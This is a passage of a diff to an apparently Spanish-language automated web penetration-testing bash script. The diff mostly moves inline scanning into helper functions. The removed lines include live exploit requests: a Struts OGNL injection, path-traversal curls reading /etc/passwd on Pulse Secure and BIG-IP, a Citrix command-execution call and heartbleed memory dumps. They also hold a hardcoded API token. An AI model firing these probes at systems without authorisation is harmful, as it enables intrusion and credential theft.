-						#nmap -n -sT -p $port $ip --script=http_vuln-cve2012-1823 >> logs/vulnerabilidades/"$ip"_"$port"_cgi.txt 2>/dev/null 
-						#grep "|" logs/vulnerabilidades/"$ip"_"$port"_cgi.txt > .vulnerabilidades/"$ip"_"$port"_cgi.txt  	
-
-						#  CVE-2021-4177
-						echo -e "\t\t[+] Revisando apache traversal)" 
-						apache-traversal.py  --target  $ip --port $port > logs/vulnerabilidades/"$ip"_"$port"_apacheTraversal.txt  	
-						grep --color=never ":x:" logs/vulnerabilidades/"$ip"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$ip"_"$port"_apacheTraversal.txt
-													
-						echo -e "\t\t[+] Revisando directorios comunes ($ip -Apache/nginx)"	
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m folders -s 0 -q 1 >> logs/enumeracion/"$ip"_"$port"_webdirectorios.txt &
-						sleep 1	
-						echo -e "\t\t[+] Revisando paneles administrativos ($ip -Apache/nginx)"				
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m admin -s 0 -q 1 >> logs/enumeracion/"$ip"_"$port"_admin.txt  
-						egrep --color=never "^200|^401" logs/enumeracion/"$ip"_"$port"_admin.txt   >> .enumeracion/"$ip"_"$port"_admin.txt  
-						sleep 1
-						echo -e "\t\t[+] Revisando archivos comunes de servidor ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m webserver -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt &
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando backups de archivos de configuración ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m backupApache -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando archivos de genericos ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m files -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt &
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando archivos de php ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h 40 -d / -m php -s 0 -q 1 | egrep --color=never "^200" >> .enumeracion/"$ip"_"$port"_webarchivos.txt
-						sleep 1
-						
-						if [ $internet == "s" ]; then 
-							egrep -i "is behind" .enumeracion/"$ip"_"$port"_wafw00f.txt 2>/dev/null
-							greprc=$?
-							if [[ $greprc -ne 0 ]];then # si hay no hay firewall protegiendo la app								
-								echo -e "\t\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
-								web-buster.pl -t $ip -p $port -h $hilos_web -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt  
-								sleep 1						
-							fi	
-						else
-							echo -e "\t\t[+] Revisando archivos CGI ($ip -Apache/nginx)"
-							web-buster.pl -t $ip -p $port -h $hilos_web -d / -m cgi -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt  
-							sleep 1													
-						fi	
-												
-						echo -e "\t\t[+] Revisando archivos peligrosos ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m files2 -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt 
-						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando si el registro de usuarios esta habilitado ($ip - Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m registroHabilitado -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_registroHabilitado.txt 
-						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_registroHabilitado.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_registroHabilitado.txt
-						sleep 1								
-						
-						echo -e "\t\t[+] Revisando archivos por defecto ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m default -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}'> .vulnerabilidades/"$ip"_"$port"_archivosDefecto.txt  &
-						#web-buster.pl -t $ip -p $port -h $hilos_web -d / -m default -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_archivosDefecto.txt 
-						#egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_archivosDefecto.txt  | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_archivosDefecto.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando la existencia de backdoors ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m backdoorApache -s 0 -q 1 > logs/vulnerabilidades/"$ip"_"$port"_webshell.txt  
-						egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_webshell.txt   | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_webshell.txt  
-						sleep 1
-						
-						echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($ip -Apache/nginx)"
-						web-buster.pl -t $ip -p $port -h $hilos_web -d / -m information -s 0 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null 						
+					if [[ $greprc -eq 0 && ! -f .enumeracion/"$ip"_"$port"_webarchivos.txt  ]];then # si el banner es Apache y no se enumero antes																								
+						enumeracionApache "http" $ip $port						
 					else
 						echo -e "\t\t[+] No es Apache o no debemos escanear"													
 					fi						
-					####################################						
-										
-				
-					#######  DLINK backdoor ######
-					
-					respuesta=`grep -i alphanetworks .enumeracion/"$ip"_"$port"_webData.txt`
-					greprc=$?
-					if [[ $greprc -eq 0 ]];then 		
-						echo -e "\t$OKRED[!] DLINK Vulnerable detectado \n $RESET"						
-						echo -n "[DLINK] $respuesta" >> .vulnerabilidades/"$ip"_"$port"_backdoorFabrica.txt 
-						
-					fi
-					###########################											
+					####################################	
+
+					#######  if the server is IoT ######
+					enumeracionIOT	"http" $ip $port
+					cloneSite "http" $ip $port	
+					####################################															
+								
 				fi # fin si no hay redireccion http --> https 
 								
 			break
@@ -2752,19 +3449,19 @@ then
 			if [[ $free_ram -gt $min_ram && $script_instancias -lt 4  ]];then 	
 				echo -e "[+] Escaneando $ip:$port"
 				echo -e "\t[+] Obteniendo información web"
-				webData.pl -t $ip -p $port -s 1 -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null  &	
+				webData.pl -t $ip -p $port -s https -e todo -d / -l logs/enumeracion/"$ip"_"$port"_webData.txt -r 4 > .enumeracion/"$ip"_"$port"_webData.txt 2>/dev/null  &	
 				echo -e "\t[+] Obteniendo información del certificado SSL"
 				get_ssl_cert.py $ip $port  2>/dev/null | grep "("> .enumeracion/"$ip"_"$port"_cert.txt  &
 				echo -e "\t"	
 				sleep 0.5;	
 				
 				######## revisar por dominio #######
-				if grep -q "," "$prefijo$FILE" 2>/dev/null; then			
-					lista_subdominios=`grep --color=never $ip $prefijo$FILE | cut -d "," -f2`
+				if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then			
+					lista_subdominios=`grep --color=never $ip $prefijo$IP_LIST_FILE | cut -d "," -f2`
 					#echo "lista_subdominios $lista_subdominios"
 					for subdominio in $lista_subdominios; do					
 						echo -e "\t\t[+] Obteniendo informacion web (subdominio: $subdominio)"	
-						webData.pl -t $subdominio -p $port -s 1 -e todo -d / -l logs/enumeracion/"$subdominio"_"$port"_webData.txt -r 4 > .enumeracion/"$subdominio"_"$port"_webData.txt 2>/dev/null 
+						webData.pl -t $subdominio -p $port -s https -e todo -d / -l logs/enumeracion/"$subdominio"_"$port"_webData.txt -r 4 > .enumeracion/"$subdominio"_"$port"_webData.txt 2>/dev/null 
 					done
 				fi
 				################################	
@@ -2802,10 +3499,10 @@ then
 				perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 			   
 				if [[ $free_ram -gt $min_ram && $perl_instancias -lt $max_perl_instancias  ]];then 
 			 				
-				#echo "FILE $prefijo$FILE"				
+				#echo "FILE $prefijo$IP_LIST_FILE"				
 				######## revisar por dominio #######
-				if grep -q "," "$prefijo$FILE" 2>/dev/null; then
-					lista_subdominios=`grep --color=never $ip -a $prefijo$FILE | cut -d "," -f2`
+				if grep -q "," "$prefijo$IP_LIST_FILE" 2>/dev/null; then
+					lista_subdominios=`grep --color=never $ip -a $prefijo$IP_LIST_FILE | cut -d "," -f2`
 					#echo "lista_subdominios $lista_subdominios"
 					for subdominio in $lista_subdominios; do
 						echo -e "\t[+] subdominio: $subdominio"	
@@ -2844,107 +3541,25 @@ then
 						if [[ ($hostOK -eq 1 &&  $noEscaneado -eq 1) || ($accesoDenegado -eq 0)]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio. Si sale acceso denegado escanear por directorios
 							echo "Realizando tests adicionales "
 							echo $checksumline >> webClone/checksumsEscaneados.txt												
-							if [ $internet == "s" ]; then 	
-								echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
-								wafw00f https://$subdominio:$port > logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt
-								grep "is behind" logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt > .enumeracion/"$subdominio"_"$port"_wafw00f.txt								
-							fi	
+							
+							echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
+							wafw00f https://$subdominio:$port > logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt
+							grep "is behind" logs/enumeracion/"$subdominio"_"$port"_wafw00f.txt > .enumeracion/"$subdominio"_"$port"_wafw00f.txt								
+						
 														
 							###  if the server is apache ######
 							egrep -i "apache|nginx|kong" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
 							greprc=$?
-							if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes				
-												
-								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
-									echo -e "\t\t[+] Revisando directorios comunes ($subdominio - Apache/nginx)"
-									web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m folders -s 1 -q 1 >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &								
-									sleep 1								
-								fi	
-
-								#  CVE-2021-4177
-								echo -e "\t\t[+] Revisando apache traversal)" 
-								apache-traversal.py  --target  $subdominio --port $port > logs/vulnerabilidades/"$subdominio"_"$port"_apacheTraversal.txt  	
-								grep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$subdominio"_"$port"_apacheTraversal.txt								
-								
-								echo -e "\t\t[+] Revisando paneles administrativos ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m admin -s 1 -q 1 >>  logs/enumeracion/"$subdominio"_"$port"_admin.txt 
-								egrep --color=never "^200|^401" logs/enumeracion/"$subdominio"_"$port"_admin.txt  > .enumeracion/"$subdominio"_"$port"_admin.txt 
-								sleep 1
-								echo -e "\t\t[+] Revisando archivos comunes de servidor ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio  -p $port -h $hilos_web -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt &
-								sleep 1
-								echo -e "\t\t[+] Revisando backups de archivos de configuración ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m backupApache -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt 
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando backups de archivos genericos ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m files -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt &
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando backups de archivos PHP ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h 40 -d / -m php -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt 
-								sleep 1
-								
-								egrep -i "is behind" .enumeracion/"$subdominio"_"$port"_wafw00f.txt
-								greprc=$?
-								if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
-									echo -e "\t\t[+] Revisando archivos CGI ($subdominio - Apache/nginx)"
-									web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m cgi -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> servicios/cgi.txt; cat servicios/cgi.txt >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt
-									sleep 1
-								fi	
-						
-								
-								echo -e "\t\t[+] Revisando archivos peligrosos ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m files2 -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_archivosPeligrosos.txt  
-								sleep 1												
-								
-								echo -e "\t\t[+] Revisando archivos por defecto ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m default -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_archivosDefecto.txt  &
-								sleep 1
-								
-								echo -e "\t\t[+] Revisando si el registro de usuarios esta habilitado ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m registroHabilitado -s 1 -q 1 > logs/vulnerabilidades/"$subdominio"_"$port"_registroHabilitado.txt 
-								egrep --color=never "^200" logs/vulnerabilidades/"$subdominio"_"$port"_registroHabilitado.txt  | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_registroHabilitado.txt
-								sleep 1	
-								
-								echo -e "\t\t[+] Revisando la existencia de backdoors ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m backdoorApache -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' >> .vulnerabilidades/"$subdominio"_"$port"_webshell.txt  
-								sleep 1
-								echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($subdominio - Apache/nginx)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m information -s 1 -q 1 | egrep --color=never "^200" | awk '{print $2}' > logs/enumeracion/"$subdominio"_"$port"_divulgacionInformacion.txt 2>/dev/null &
+							if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes																
+								enumeracionApache "https" $subdominio $port
 							fi						
 							####################################	
 							
 							#######  if the server is IIS ######
 							grep -i IIS .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud"  # no redirecciona
 							greprc=$?
-							if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes							
-								
-								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
-									echo -e "\t\t[+] Revisando directorios ($subdominio - IIS)"
-									web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m folders -s 1 -q 1 | egrep --color=never "^200" >> logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt &
-									sleep 1
-								fi									
-								
-								echo -e "\t\t[+] Revisando paneles administrativos ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m admin -s 1 -q 1 > logs/enumeracion/"$subdominio"_"$port"_admin.txt
-								egrep --color=never "^200|^401" logs/enumeracion/"$subdominio"_"$port"_admin.txt >> .enumeracion/"$subdominio"_"$port"_admin.txt
-								sleep 1
-								echo -e "\t\t[+] Revisando archivos comunes de servidor ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt & 
-								sleep 1
-								echo -e "\t\t[+] Revisando archivos de sharepoint ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m sharepoint -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-								echo -e "\t\t[+] Revisando archivos de webservices ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m webservices -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1
-								echo -e "\t\t[+] Revisando la existencia de backdoors ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m backdoorIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/"$subdominio"_"$port"_webshell.txt  
-								sleep 1
-								echo -e "\t\t[+] Revisando backups de archivos de configuración ($subdominio - IIS)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m backupIIS -s 1 -q 1 | egrep --color=never "^200" >> .vulnerabilidades/"$subdominio"_"$port"_webarchivos.txt  
-								sleep 1										   
+							if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes															
+								enumeracionIIS "https" $subdominio $port								   
 							fi
 										
 							####################################	
@@ -2953,200 +3568,14 @@ then
 							#######  if the server is tomcat ######
 							egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$subdominio"_"$port"_webData.txt | egrep -qiv "302 Found" 
 							greprc=$?				
-							if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes
-								echo -e "\t\t[+] Revisando Apache struts"
-								curl --insecure --max-time 2 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable')).(#ros.flush())}" "https://$subdominio:$port/" > logs/vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt  2>/dev/null
-								grep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt > .vulnerabilidades/"$subdominio"_"$port"_apacheStruts.txt
-								
-								if [[ ${subdominio} != *"nube"* && ${subdominio} != *"webmail"*  && ${subdominio} != *"autodiscover"* ]];then 
-									echo -e "\t\t[+] Revisando directorios y archivos comunes ($subdominio - Tomcat)"
-									web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m folders -s 1 -q 1 >> logs/enumeracion/"$subdominio"_"$port"_webdirectorios.txt  &
-									sleep 1
-								fi								
-								
-								echo -e "\t\t[+] Revisando archivos comunes de tomcat ($subdominio - Tomcat)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m tomcat -s 1 -q 1  >> logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt 
-								egrep --color=never "^200|^401" logs/enumeracion/"$subdominio"_"$port"_webarchivos.txt  > .enumeracion/"$subdominio"_"$port"_webarchivos.txt 
-								sleep 1
-								echo -e "\t\t[+] Revisando archivos comunes de servidor ($subdominio - Tomcat)"
-								web-buster.pl -t $subdominio -p $port -h $hilos_web -d / -m webserver -s 1 -q 1 | egrep --color=never "^200" >> .enumeracion/"$subdominio"_"$port"_webarchivos.txt & 							
-								sleep 1										
+							if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes								
+								enumeracionTomcat "https" $subdominio $port																							
 							fi
 										
 							####################################
 								
-						    #######  drupal (domain) ######
-							grep -qi drupal .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								wpscan  --update
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de drupal ($subdominio)"
-								droopescan scan drupal -u  https://$subdominio --output json > logs/vulnerabilidades/"$subdominio"_"$port"_droopescan.txt								
-								cat logs/vulnerabilidades/"$subdominio"_"$port"_droopescan.txt > .enumeracion/"$subdominio"_"$port"_droopescan.txt																																								
-							fi
-
-							#######  wordpress (dominio) ######
-							grep -qi wordpress .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 	
-
-								wpscan  --update
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de wordpress ($subdominio)"
-								wpscan --disable-tls-checks  --enumerate u  --random-user-agent --url https://$subdominio --format json > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt
-								wpscan --disable-tls-checks  --random-user-agent --url https://$subdominio/ --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U  > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
-								
-								#msfconsole -x "use auxiliary/scanner/http/wordpress_content_injection;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
-								
-								grep -qi "The URL supplied redirects to" logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt
-								greprc=$?
-								if [[ $greprc -eq 0 ]];then 		
-									echo -e "\t\t\t[+] Redireccion en wordpress"
-									url=`cat logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt | perl -lne 'print $& if /http(.*?)\. /' |sed 's/\. //g'`
-									
-									wpscan --disable-tls-checks --enumerate u  --random-user-agent --url $url > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt									
-									wpscan --disable-tls-checks --random-user-agent --url $url --enumerate ap,cb,dbe --api-token vFOFqWfKPapIbUPvqQutw5E1MTwKtqdauixsjoo197U > logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt
-									
-								fi
-	
-								grep "Title" logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt | cut -d ":" -f2 > .vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt
-								strings logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt | grep --color=never "Title" -m1 -b3 -A19 >> logs/vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt
-								if [[ ! -s .vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt  ]] ; then
-									strings logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt | grep --color=never "out of date" -m1 -b3 -A19 >> logs/vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt
-									cp logs/vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt .vulnerabilidades/"$subdominio"_"$port"_pluginDesactualizado.txt
-								fi
-								
-								
-								strings logs/vulnerabilidades/"$subdominio"_"$port"_wpscan.txt | grep --color=never "XML-RPC seems" -m1 -b1 -A9 > logs/vulnerabilidades/"$subdominio"_"$port"_configuracionInseguraWordpress.txt
-								cat logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt | wpscan-parser.py > .vulnerabilidades/"$subdominio"_"$port"_wpUsers.txt
-								grep -i users logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers2.txt -m1 -b1 -A20 > logs/vulnerabilidades/"$subdominio"_"$port"_wpUsers.txt
-
-
-							fi
-							###########################	
-							
-							#######  citrix (subdominio) ######
-							grep -qi citrix .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de citrix ($subdominio)"
-							
-								CVE-2019-19781.sh $subdominio $port "cat /etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
-								egrep --color=never "root" logs/vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt > .vulnerabilidades/"$subdominio"_"$port"_citrixVul.txt
-						
-							fi
-							###################################	
-							
-							
-							#######  Pulse secure (domain) ######
-							grep -qi pulse .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de Pulse Secure ($subdominio)"
-								
-								curl --path-as-is -s -k "https://$subdominio/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/" > logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
-								egrep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt > .vulnerabilidades/"$subdominio"_"$port"_pulseVul.txt
-								
-							fi
-							###################################	
-							
-							
-							#######  BIG-IP F5 (domain) ######
-							grep -qi "BIG-IP" .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de BIG-IP F5  ($subdominio)"
-								
-								curl --path-as-is -s -k "https://$subdominio/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" > logs/vulnerabilidades/"$subdominio"_"$port"_bigIPVul.txt
-								egrep --color=never ":x:" logs/vulnerabilidades/"$subdominio"_"$port"_bigIPVul.txt > .vulnerabilidades/"$subdominio"_"$port"_bigIPVul.txt
-								
-							fi
-							###################################
-							
-							
-							#######  OWA (domain) ######
-							egrep -qi "Outlook|owa" .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 														
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de OWA($subdominio)"
-								
-								owa.pl -host $subdominio -port $port  > logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
-								egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$subdominio"_"$port"_owaVul.txt > .vulnerabilidades/"$subdominio"_"$port"_owaVul.txt
-								
-							fi
-							###################################	
-
-							#######  grafana (domain) ######
-							egrep -qi "Grafana" .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 		
-								echo -e "\t\t\t[+] Revisando vulnerabilidades de Grafana($subdominio)"
-								
-								grafana.py -H $subdominio -p $port  > logs/vulnerabilidades/"$subdominio"_"$port"_grafana.txt 2>/dev/null
-								egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$subdominio"_"$port"_grafana.txt > .vulnerabilidades/"$subdominio"_"$port"_grafana.txt
-								
-							fi
-							###################################								
-							
-							#######  joomla (domain) ######
-							grep -qi joomla .enumeracion/"$subdominio"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 										
-								echo -e "\t\t[+] Revisando vulnerabilidades de joomla"
-								joomscan.sh -u https://$subdominio/ | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/"$subdominio"_"$port"_joomscan.txt &
-								JoomlaJCKeditor.py --url "https://$subdominio" > .vulnerabilidades/"$subdominio"_"$port"_JoomlaJCKeditor.txt
-							fi
-							###################################	
-							
-							#######  WAMPSERVER (domain) ######
-							grep -qi WAMPSERVER .enumeracion/"$ip"_"$port"_webData.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]];then 										
-								echo -e "\t[+] Enumerando WAMPSERVER"
-								wampServer.pl -url http://$subdominio/ > .enumeracion/"$subdominio"_"$port"_WAMPSERVER.txt &
-							fi
-							###################################	
-							
-							#######  hearbleed (dominio) ######						
-							echo -e "\t\t\t[+] Revisando vulnerabilidad heartbleed"
-							echo "nmap -n -sT -Pn -p $port --script=ssl-heartbleed $subdominio" > logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt 2>/dev/null 
-							nmap -n -sT -Pn -p $port --script=ssl-heartbleed $subdominio >> logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt 2>/dev/null 
-							egrep -qi "VULNERABLE" logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt
-							greprc=$?
-							if [[ $greprc -eq 0 ]] ; then						
-								echo -e "\t\ŧ$OKRED[!] Vulnerable a heartbleed \n $RESET"
-								grep "|" logs/vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$subdominio"_"$port"_heartbleed.txt				
-								heartbleed.py $subdominio -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$subdominio"_"$port"_heartbleedRAM.txt
-								heartbleed.sh $subdominio $port &
-							else							
-								echo -e "\t\t$OKGREEN[i] No vulnerable a heartbleed $RESET"
-							fi
-							##########################
-							
-							
-							#######  Configuracion TLS/SSL (dominio) ######						
-							echo -e "\t\t\t[+] Revisando configuracion TLS/SSL"
-							
-							#testssl.sh --color 0  "https://$subdominio:$port" > logs/vulnerabilidades/"$subdominio"_"$port"_confTLS.txt 2>/dev/null 
-							#grep --color=never "incorrecta" logs/vulnerabilidades/"$subdominio"_"$port"_confTLS.txt | egrep -iv "Vulnerable a" > .vulnerabilidades/"$subdominio"_"$port"_confTLS.txt
